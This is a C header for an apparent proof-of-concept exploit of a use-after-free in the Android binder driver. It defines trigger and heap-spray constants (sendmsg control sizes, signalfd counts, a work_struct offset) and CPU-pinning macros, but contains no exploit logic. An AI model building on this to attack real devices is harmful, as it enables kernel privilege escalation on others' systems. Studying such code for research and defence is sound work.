#pragma once

//#ifndef __POC_H__
#define __POC_H__

#include <linux/android/binder.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/signalfd.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <unistd.h>
// defines to trigger uaf
#define NB_TRIGGER_THREADS 2
#define MEM_ADDR 0x80000000
#define MEM_SIZE 0x1000 
#define OFFSETS_START 0x500
#define MAP_ANONYMOUS 0x20
// defines to trigger uaf
#define NB_TRIGGER_SPRAY 5
#define SENDMSG_SIZE 4
#define SENDMSG_CONTROL_SIZE 128
#define WORK_STRUCT_OFFSET 8
#define SPRAY_DELAY 100000
#define NB_SIGNALFDS 20


// pin cpu, could speed up uaf, but not implemented yet
#ifndef CPU_ZERO
#define CPU_SETSIZE 1024
#define __NCPUBITS  (8 * sizeof (unsigned long))
typedef struct
{
    unsigned long __bits[CPU_SETSIZE / __NCPUBITS];
} cpu_set_t;
 
#define CPU_SET(cpu, cpusetp) \
  ((cpusetp)->__bits[(cpu)/__NCPUBITS] |= (1UL << ((cpu) % __NCPUBITS)))
#define CPU_ZERO(cpusetp) \
  memset((cpusetp), 0, sizeof(cpu_set_t))
#endif
